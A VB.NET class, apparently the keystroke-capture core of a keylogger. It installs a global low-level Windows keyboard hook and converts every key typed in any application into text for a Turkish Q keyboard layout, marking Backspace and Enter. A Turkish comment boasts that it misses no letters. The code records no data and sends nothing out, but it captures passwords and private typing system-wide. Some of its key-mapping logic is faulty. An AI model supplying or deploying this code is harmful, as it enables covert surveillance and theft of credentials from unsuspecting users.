Public Class Klavye
    Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal Hook As Integer, ByVal KeyDelegate As KDel, ByVal HMod As Integer, ByVal ThreadId As Integer) As Integer
    Private Declare Function CallNextHookEx Lib "user32" (ByVal Hook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
    Private Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal Hook As Integer) As Integer
    Private Delegate Function KDel(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
    Public Shared Event Down(ByVal Key As String)
    Public Shared Event Up(ByVal Key As String)
    Private Shared Key As Integer
    Private Shared KHD As KDel

    Private Structure KeyStructure : Public Code As Integer : Public ScanCode As Integer : Public Flags As Integer : Public Time As Integer : Public ExtraInfo As Integer : End Structure
''BÜTÜN TÜRKÇE KARAKTERLERE DESTEKLİDİR HARF KAÇIRMAZ.
    Public Sub CreateHook()
        KHD = New KDel(AddressOf Proc)
        Key = SetWindowsHookEx(13, KHD, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
    End Sub

    Private Function Proc(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
        If (Code = 0) Then
            Select Case wParam
                Case &H100, &H104 : RaiseEvent Down(Feed(CType(lParam.Code, Keys)))
                Case &H101, &H105 : RaiseEvent Up(Feed(CType(lParam.Code, Keys)))
            End Select
        End If
        Return CallNextHookEx(Key, Code, wParam, lParam)
    End Function
    Public Sub DiposeHook()
        UnhookWindowsHookEx(Key)
        MyBase.Finalize()
    End Sub
    Private Function Feed(ByVal e As Keys) As String
        Select Case e

            Case 8
                Return ">Backspace<"
            Case 13
                Return ">Enter<"
            Case 20
                Return ">Capslock<"
            Case 32
                Return " "

            Case 81



                If (Control.ModifierKeys And Keys.Alt) <> 0 Then
                    Return "@"
                ElseIf (Keys.Q) <> 0 Then
                    Dim capslockacıkmıqiçin As String = My.Computer.Keyboard.CapsLock
                    If capslockacıkmıqiçin = True Then
                        Return "Q"
                    Else
                        Return "q"
                    End If
                Else


                End If

            Case 223
                If (Control.ModifierKeys And Keys.Alt) <> 0 Then
                    Return "\"
                End If
            Case 226
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Return ">"
                ElseIf (Control.ModifierKeys And Keys.Alt <> 0) Then
                    Return "|"
                Else
                    Return "<"
                End If
            Case 65 To 90

                If Control.IsKeyLocked(Keys.CapsLock) Or (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Return e.ToString
                Else
                    Return e.ToString.ToLower


                End If

            Case 48 To 57







                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case e.ToString
                        Case "D1" : Return "!"
                        Case "D2" : Return "'"
                        Case "D3" : Return "^^"
                        Case "D4" : Return "+"
                        Case "D5" : Return "%"
                        Case "D6" : Return "&"
                        Case "D7" : Return "/"
                        Case "D8" : Return "("
                        Case "D9" : Return ")"
                        Case "D0" : Return "="
                    End Select
                ElseIf (Control.ModifierKeys And Keys.Alt) <> 0 Then
                    Select Case e.ToString
                        Case "D1" : Return ">"
                        Case "D2" : Return "£"
                        Case "D3" : Return "#"
                        Case "D4" : Return "$"
                        Case "D5" : Return "½"
                        Case "D6" : Return "Nothing"
                        Case "D7" : Return "{"
                        Case "D8" : Return "["
                        Case "D9" : Return "]"
                        Case "D0" : Return "}"

                    End Select






                Else
                    Return e.ToString.Replace("D", Nothing)
                End If

            Case 96 To 105
                Return e.ToString.Replace("NumPad", Nothing)
            Case 106 To 111
                Select Case e.ToString
                    Case "Divide" : Return "/"
                    Case "Multiply" : Return "*"
                    Case "Subtract" : Return "-"
                    Case "Add" : Return "+"
                    Case "Decimal" : Return ","
                End Select


            Case 186 To 222
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case e.ToString
                        Case "OemMinus" : Return "_"
                        Case "Oemplus" : Return "+"
                        Case "OemOpenBrackets" : Return "{"
                        Case "Oem6" : Return "Ü"
                        Case "Oem5" : Return "Ç"
                        Case "Oem1" : Return "Ş"
                        Case "Oem7" : Return "İ"
                        Case "Oemcomma" : Return ";"
                        Case "OemPeriod" : Return ":"
                        Case "OemQuestion" : Return "Ö"
                        Case "Oemtilde" : Return "é"
                    End Select
                ElseIf (Control.ModifierKeys And Keys.Alt) <> 0 Then
                    Select Case e.ToString
                        Case "Oemtilde" : Return "<"
                    End Select

                Else
                    If My.Computer.Keyboard.CapsLock = True Then
                        Select Case e.ToString

                            Case "OemMinus" : Return "-"
                            Case "Oemplus" : Return "="
                            Case "OemOpenBrackets" : Return "Ğ"
                            Case "Oem6" : Return "Ü"
                            Case "Oem5" : Return "Ç"
                            Case "Oem1" : Return "Ş"
                            Case "Oem7" : Return "İ"
                            Case "Oemcomma" : Return ","
                            Case "OemPeriod" : Return "."
                            Case "OemQuestion" : Return "Ö"
                            Case "Oemtilde" : Return """"
                        End Select

                    Else
                    Select Case e.ToString
                        Case "OemMinus" : Return "-"
                        Case "Oemplus" : Return "="
                        Case "OemOpenBrackets" : Return "ğ"
                        Case "Oem6" : Return "ü"
                        Case "Oem5" : Return "ç"
                        Case "Oem1" : Return "ş"
                        Case "Oem7" : Return "i"
                        Case "Oemcomma" : Return ","
                        Case "OemPeriod" : Return "."
                        Case "OemQuestion" : Return "ö"
                        Case "Oemtilde" : Return """"
                    End Select
                End If
                End If


            Case Keys.Return
                Return Environment.NewLine
            Case Else
                Return "<" + e.ToString + ">"
        End Select
        Return Nothing
    End Function
End Class
